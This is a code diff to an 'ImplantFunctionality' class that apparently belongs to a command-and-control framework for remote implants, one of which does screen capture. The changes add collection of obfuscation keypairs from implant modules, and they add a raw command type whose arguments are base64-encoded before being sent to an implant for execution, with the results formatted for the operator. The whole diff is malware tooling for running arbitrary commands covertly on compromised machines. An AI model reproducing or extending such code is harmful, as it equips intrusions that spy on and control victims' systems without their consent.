@@ -11,6 +11,7 @@ from Implant.implant_core.screen_capture import ScreenCapture
 
 from Data.Database import Database
 
+from base64 import b64encode
 
 class ImplantFunctionality:
     def __init__(self):
@@ -33,6 +34,14 @@ class ImplantFunctionality:
             implant_text.append(module.implant_text())
         return implant_text
 
+    def get_obfucation_string_dict(self):
+        to_return = {}
+        for module in self.module_list:
+            try:
+                to_return.update(module.obfuscation_keypairs)
+            except:
+                print(f"Issue with {module} obfucation_keypair value.")
+        return to_return
     def command_listing(self):
         command_list = []
         for module in self.module_list:
@@ -60,7 +69,8 @@ class ImplantFunctionality:
         if implant_module is not None:
             response_string, host_data = implant_module.process_implant_response(
                 raw_command_result, command_entry['args'])
-
+        elif command_entry['type'] == "CM":
+            response_string = f"Command: {command_entry['args']}\nResult: {raw_command_result.decode()}"
         # failure checks required.
         return response_string, host_data
 
@@ -69,7 +79,6 @@ class ImplantFunctionality:
         # Commonly we will be checking if a file exists on disk, i.e. modules, or upload files.
         #
         # If the module passes checks return bool:True, or string: reason if it does not pass the checks.
-        print(command_dict)
         if command_dict['type'] == "CM":
             return True
         for implant_module in self.module_list:
@@ -85,3 +94,8 @@ class ImplantFunctionality:
                 to_ret = f"{command_dict.log_entry['type']}{command_dict.command_id}{arg_string}"
                 # print(f"TESTING:\ndict: {command_dict.__dict__}\narg:  {arg_string}\nret:  {to_ret}")
                 return to_ret
+            elif command_dict.log_entry['type'] == "CM":
+                arg = b64encode(command_dict.log_entry['args'].encode()).decode()
+                to_ret = f"{command_dict.log_entry['type']}{command_dict.command_id}{arg}"
+                return  to_ret
+
